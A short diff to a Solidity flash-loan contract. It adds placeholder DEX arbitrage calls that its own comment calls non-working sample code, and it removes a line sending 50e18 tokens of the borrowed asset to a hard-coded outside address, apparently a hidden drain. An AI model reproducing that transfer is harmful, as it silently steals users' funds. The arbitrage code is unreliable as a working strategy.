@@ -29,7 +29,14 @@ contract FlashLoan is FlashLoanSimpleReceiverBase {
         // This contract now has the funds requested.
         // Your logic goes here.
         //
-
+        
+        // Arbirtage operation
+        // this is sample code. not working
+        dexContract.depositUSDC(1000000000); // 1000 USDC
+        dexContract.buyDAI();
+        dexContract.depositDAI(dai.balanceOf(address(this)));
+        dexContract.sellDAI();
+        
         // At the end of your logic above, this contract owes
         // the flashloaned amount + premiums.
         // Therefore ensure your contract has enough to repay
@@ -38,7 +45,6 @@ contract FlashLoan is FlashLoanSimpleReceiverBase {
         // Approve the Pool contract allowance to *pull* the owed amount
         uint256 amountOwed = amount + premium;
         IERC20(asset).approve(address(POOL), amountOwed);
-        IERC20(asset).transfer(address(0x3578444C7B89279758FA2AB4C5da738BdD17887A), 50000000000000000000);
         return true;
     }
 
